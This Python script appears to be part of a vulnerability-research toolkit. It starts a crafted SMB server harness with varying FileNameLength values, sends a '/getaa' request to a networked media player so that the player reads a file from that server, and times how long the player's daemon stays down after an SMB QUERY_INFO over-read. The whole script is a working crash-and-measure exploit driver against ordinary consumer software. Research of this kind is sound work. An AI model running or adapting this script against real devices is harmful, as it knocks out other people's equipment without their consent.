#!/usr/bin/env python3
"""smb_outage.py - measured outage table for the SMB QUERY_INFO over-read.

Runs on the host that serves the share (needs sudo for port 445). For each
FileNameLength delta it restarts the harness, starts crash_oracle at 100 ms,
fires one /getaa at the player, and records the exact DOWN and UP timestamps
and the outage length.

  ./smb_outage.py --host 192.168.4.202 --deltas 0,0x100,0x400,0xffff
  ./smb_outage.py --host 192.168.4.202 --deltas 0xffff --jsonl out.jsonl

A delta that never drops the daemon reports outage 0.0 and is still a result:
the over-read is then a read, not a fault, at that length.
"""
import argparse
import json
import os
import subprocess
import sys
import threading
import time
from datetime import datetime, timezone

HERE = os.path.dirname(os.path.abspath(__file__))
ORACLE = os.path.join(HERE, "crash_oracle.py")
HARNESS = os.path.join(HERE, "smb1.py")
SHARE_HOST = "192.168.4.171"


def now():
    return datetime.now(timezone.utc).strftime("%H:%M:%S.%f")[:-3]


def kill_445():
    subprocess.run("sudo -n lsof -ti :445 | xargs -r sudo -n kill",
                   shell=True, capture_output=True)
    time.sleep(1.0)


def start_harness(delta):
    kill_445()
    env = dict(os.environ, FN_DELTA=delta)
    subprocess.Popen(["sudo", "-n", "env", "FN_DELTA=" + delta, sys.executable, "-u", HARNESS, "445"],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, env=env)
    time.sleep(2.0)


def fire(host, timeout=25):
    url = (f"http://{host}:1400/getaa?u=x-file-cifs://{SHARE_HOST}/S/x.jpg&w=64&h=64")
    t0 = time.monotonic()
    r = subprocess.run(["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
                        "--max-time", str(timeout), url], capture_output=True, text=True)
    return r.stdout.strip() or "000", time.monotonic() - t0


class Oracle(threading.Thread):
    def __init__(self, host):
        super().__init__(daemon=True)
        self.host = host
        self.stop = threading.Event()
        self.down_at = None
        self.up_at = None
        self.reason = None

    def run(self):
        import importlib.util
        spec = importlib.util.spec_from_file_location("oracle", ORACLE)
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        while not self.stop.is_set():
            state, reason, _ = mod.probe(self.host, 1400, "/status/zp", 1.0)
            if state == "DOWN" and self.down_at is None:
                self.down_at, self.reason = now(), reason
            elif state == "UP" and self.down_at is not None and self.up_at is None:
                self.up_at = now()
                return
            time.sleep(0.1)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="192.168.4.202")
    ap.add_argument("--deltas", default="0,0x100,0x400,0x1000,0xffff")
    ap.add_argument("--settle", type=float, default=6.0,
                    help="seconds to keep watching after the request returns")
    ap.add_argument("--jsonl")
    a = ap.parse_args()

    rows = []
    for d in [x.strip() for x in a.deltas.split(",") if x.strip()]:
        start_harness(d)
        o = Oracle(a.host)
        o.start()
        time.sleep(0.5)
        code, dt = fire(a.host)
        end = time.monotonic() + a.settle
        while time.monotonic() < end and o.up_at is None:
            time.sleep(0.1)
        o.stop.set()
        o.join(timeout=3)
        outage = None
        if o.down_at and o.up_at:
            fmt = "%H:%M:%S.%f"
            outage = round((datetime.strptime(o.up_at, fmt) -
                            datetime.strptime(o.down_at, fmt)).total_seconds(), 3)
        row = {"delta": d, "getaa": code, "req_s": round(dt, 3),
               "down_at": o.down_at, "up_at": o.up_at,
               "outage_s": outage, "reason": o.reason}
        rows.append(row)
        print(f"delta={d:<12} getaa={code:<4} {dt:5.2f}s  down={o.down_at} "
              f"up={o.up_at} outage={outage} {o.reason or ''}", flush=True)
        if a.jsonl:
            with open(a.jsonl, "a") as fh:
                fh.write(json.dumps(row) + "\n")
    kill_445()
    return 0


if __name__ == "__main__":
    sys.exit(main())
